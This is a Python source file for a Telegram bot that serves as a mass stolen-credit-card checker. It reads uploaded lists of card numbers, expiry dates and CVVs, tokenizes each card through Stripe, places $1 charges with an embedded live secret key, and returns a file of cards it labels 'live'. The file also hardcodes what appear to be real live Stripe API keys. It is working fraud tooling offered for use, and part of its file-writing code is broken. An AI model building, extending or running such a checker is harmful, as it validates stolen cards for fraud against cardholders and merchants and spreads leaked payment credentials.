import time
import re
import asyncio
import requests
import json
import os
import random
import string
import tempfile
from Flash import app
from config import LOGGER_ID, OWNER_ID
from pyrogram import Client, filters
import aiohttp
from requests.auth import HTTPBasicAuth
from collections import defaultdict
from requests.exceptions import RequestException

user_request_times = defaultdict(list)

ADMIN_IDS = [7019293589, 7044783841, 6757745933]
amount = 1
pk = "pk_live_51OXbs9HuccwxulvE4qJmUrLeXhdKsjGjhgipyNCt51TfSj7Jz7AWur6ZDyeSqOzEYcAMwDGljPtKmexaIz8bWYAc006C7FzhPL"
sk = "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"


def generate_short_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))


async def check_card(card_info):
    results = []
    last_response = ""

    for card in card_info:
        card = card.strip()
        if not card:
            continue

        split = card.split("|")
        if len(split) != 4:
            results.append(f"❌ **Invalid card details** for `{card}`")
            continue

        cc, mes, ano, cvv = split

        token_data = {
            "card[number]": cc,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "card[cvc]": cvv,
        }

        try:
            response = requests.post(
                "https://api.stripe.com/v1/tokens",
                data=token_data,
                headers={
                    "Authorization": f"Bearer {pk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
        except RequestException as e:
            results.append(f"❌ **Error with card `{cc}`: {str(e)}**")
            continue

        if response.status_code != 200:
            results.append(
                f"𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n"
                f"𝗦𝘁𝗮𝘁𝘂𝘀: **Declined** ❌\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: SK KEY REVOKED\n"
            )
            last_response = "SK KEY REVOKED"
            continue

        token_data = response.json()
        token_id = token_data.get("id", "")
        if not token_id:
            results.append(f"❌ **Token creation failed** for `{card}`")
            continue

        charge_data = {
            "amount": amount * 100,
            "currency": "usd",
            "source": token_id,
            "description": "Charge for product/service",
        }

        try:
            response = requests.post(
                "https://api.stripe.com/v1/charges",
                data=charge_data,
                headers={
                    "Authorization": f"Bearer {sk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
        except RequestException as e:
            results.append(f"❌ **Charge error** for `{cc}`: {str(e)}")
            continue

        chares = response.json()

        if response.status_code == 200 and chares.get("status") == "succeeded":
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅"
            resp = "Charged 1$ 🔥"
        elif "Your card's security code is incorrect." in json.dumps(chares):
            status = "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲✅"
            resp = "Your card's security code is incorrect."
        elif "insufficient funds" in json.dumps(chares):
            status = "𝗖𝗩𝗩 𝗟𝗶𝘃𝗲✅"
            resp = "Your Card has Insufficient funds."
        else:
            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱❌"
            resp = chares.get("error", {}).get(
                "decline_code", chares.get("error", {}).get("message", "Unknown error")
            )

        last_response = resp
        results.append(
            f"𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n"
            f"𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n"
        )

    return "\n".join(results), last_response


async def handle_cards(client, message, cards_info, unique_id):
    user = message.from_user
    profile_link = f"https://t.me/{user.username}"
    fullname = f"{user.first_name} {user.last_name or ''}".strip()

    processing_msg = await message.reply_text(
        f"**Gate** ➜ 𝗠𝗮𝘀𝘀 𝗦𝗞 𝗕𝗮𝘀𝗲𝗱 𝟭$\n\n"
        f"**Total CC Input** ➜ {len(cards_info)}\n"
        f"**Response** ➜ Updating...\n"
        f"**Status** ➜ Processing ■□□□\n\n"
        f"**Live Cards** ➜ 0\n"
        f"**Dead** ➜ 0\n"
        f"**Total Checked cards** ➜ 0\n\n"
        f"**sᴇᴄʀᴇᴛ ᴋᴇʏ** ➜ `{unique_id}`\n"
        f"**ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ➜ [{fullname}]({profile_link})\n",
        disable_web_page_preview=True
    )

    live_cards_count = 0
    dead_cards_count = 0
    total_checked_cards = 0

    animation_states = ['■□□□', '■■□□', '■■■□', '■■■■']

    for i, card in enumerate(cards_info):
        total_checked_cards += 1
        status_text, last_response = await check_card([card])

        if any(keyword in status_text for keyword in ["𝗖𝗩𝗩 𝗟𝗶𝘃𝗲✅", "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲✅", "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅"]):
            live_cards_count += 1
        else:
            dead_cards_count += 1

        animation = animation_states[i % len(animation_states)]
        await client.edit_message_text(
            message.chat.id, processing_msg.id,
            f"**Gate** ➜ 𝗦𝗞 𝗕𝗮𝘀𝗲𝗱 𝟭$𝗖𝗩𝗩\n\n"
            f"**Total CC Input** ➜ {len(cards_info)}\n"
            f"**Response** ➜ {last_response}\n"
            f"**Status** ➜ Processing {animation}\n\n"
            f"**Live Cards** ➜ {live_cards_count}\n"
            f"**Dead** ➜ {dead_cards_count}\n"
            f"**Total Checked cards** ➜ {total_checked_cards}\n\n"
            f"**sᴇᴄʀᴇᴛ ᴋᴇʏ** ➜ `{unique_id}`\n"
            f"**ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ➜ [{fullname}]({profile_link})\n",
            disable_web_page_preview=True
        )
        await asyncio.sleep(5)

    total_card = len(cards_info)

    final_message = (
        f"**Total cards** ➜ {total_card}\n"
        f"**Live Cards** ➜ {live_cards_count}\n"
        f"**Dead** ➜ {dead_cards_count}\n"
        f"**Status** ➜ Checked All ✅\n\n"
        f"**Get Live Cards** ➜ `/gethits xvvtxt_{unique_id}`\n"
        f"**ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ➜ [{fullname}]({profile_link})"
    ) if live_cards_count > 0 else (
        f"**Total cards** ➜ {total_card}\n\n"
        f"**Live Cards** ➜ {live_cards_count}\n"
        f"**Dead** ➜ {dead_cards_count}\n"
        f"**Status** ➜ Checked All ✅\n\n"
        f"__No Live Cards Found__"
    )

    await processing_msg.delete()
    await message.reply_text(final_message, disable_web_page_preview=True)

    if live_cards_count:
        file_name = f'live_cards_{unique_id}.txt'
        temp_file_path = os.path.join(os.getcwd(), file_name)

        with open(temp_file_path, 'w') as temp_file:
            temp_file.write("\n".join([f"Live Card ✅\n{card}" for card in live_cards_count]))

        os.environ[f'LIVE_CARDS_FILE_{unique_id}'] = temp_file_path


def check_user_limit(user_id):
    if user_id in ADMIN_IDS:
        return True, 0

    current_time = time.time()
    user_request_times[user_id] = [
        t for t in user_request_times[user_id] if current_time - t < 20
    ]

    if len(user_request_times[user_id]) >= 2:
        time_diff = 20 - (current_time - user_request_times[user_id][0])
        return False, round(time_diff, 2)

    user_request_times[user_id].append(current_time)
    return True, 0


card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")


@app.on_message(filters.command("xvvtxt", prefixes=[".", "/"]))
async def handle_check_card(client, message):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply_text("Please reply to a text file with the `/xvvtxt` command.")
        return

    if message.reply_to_message.document.mime_type == "text/plain":
        file_path = await message.reply_to_message.download()
        with open(file_path, 'r') as f:
            cards_info = f.read().splitlines()
        os.remove(file_path)

        if message.from_user.id != OWNER_ID and len(cards_info) > 3000:
            await message.reply_text("You can check a maximum of 300 cards from a text file.")
            return

        if cards_info:
            unique_id = generate_short_id()
            await handle_cards(client, message, cards_info, unique_id)
        else:
            await message.reply_text("No card found in the document.")
    else:
        await message.reply_text("Please upload a plain text (.txt) file.")


@app.on_message(filters.command("gethits", prefixes=[".", "/"]))
async def get_live_cards(client, message):
    if len(message.command) != 2:
        await message.reply_text("Please provide the unique ID in the format: /gethits xvvtxt_{unique_id}")
        return

    unique_id = message.command[1].replace("xvvtxt_", "")
    temp_file_path = os.getenv(f'LIVE_CARDS_FILE_{unique_id}')

    if temp_file_path and os.path.exists(temp_file_path):
        card_count = 0

        with open(temp_file_path, 'r') as file:
            for line in file:
                if card_pattern.search(line):
                    card_count += 1

        with open(temp_file_path, 'rb') as file:
            await message.reply_document(
                document=file,
                caption=f"Live Cards Found: {card_count}",
            )
        os.remove(temp_file_path)
        del os.environ[f'LIVE_CARDS_FILE_{unique_id}']
    else:
        await message.reply_text("__No Live Cards found__")
